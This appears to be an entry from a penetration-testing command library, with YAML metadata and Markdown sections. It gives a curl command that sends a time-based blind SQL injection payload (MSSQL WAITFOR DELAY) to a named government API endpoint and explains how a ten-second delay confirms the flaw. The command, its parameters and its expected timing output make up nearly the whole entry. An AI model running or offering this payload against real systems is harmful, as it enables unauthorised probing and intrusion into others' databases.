---
data: >-
  time curl -k
  "https://soa-accp.glbx.tva.gov/api/river/observed-data/-GVDA1'+WAITFOR+DELAY+'0:0:10'--+-"
tags:
  - sqli
  - testing
  - timing
type: command
executor: bash
platforms:
  - Linux
  - macOS
id: 09a8eb8d-21d3-4982-9802-c03e76fa02ba
created_at: '2025-12-14T17:26:17.804Z'
updated_at: '2025-12-14T17:26:17.804Z'
verified: false
validated: true
submitted: true
---
# time-curl-blind-sqli-test

## Command

```bash
time curl -k "https://soa-accp.glbx.tva.gov/api/river/observed-data/-GVDA1'+WAITFOR+DELAY+'0:0:10'--+-"
```

## Description

This command tests for blind SQL injection by sending a payload that induces a 10-second delay via WAITFOR DELAY in MSSQL, using 'time' to measure execution and 'curl' for the HTTP request. It's used to confirm vulnerability when direct output isn't available.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-k` | Skips SSL certificate verification for self-signed certs | Yes |
| `time` | Measures real, user, and sys time for the curl execution | Yes |
| `curl` | Performs the GET request to the API with the injected payload | Yes |
| URL payload | The SQL injection string: -GVDA1'+WAITFOR+DELAY+'0:0:10'--+- closes the query and adds delay | Yes |

## Examples

### Basic Usage

```bash
time curl -k "https://soa-accp.glbx.tva.gov/api/river/observed-data/-GVDA1'+WAITFOR+DELAY+'0:0:10'--+-"
```

### Advanced Usage

Add silent mode to suppress curl output: time curl -k -s "..." | head -1

## Expected Output

real    0m10.123s
user    0m0.045s
sys     0m0.012s

A 'real' time around 10 seconds indicates successful injection; normal requests take <1s.

## Related

- [[Related Procedure]]
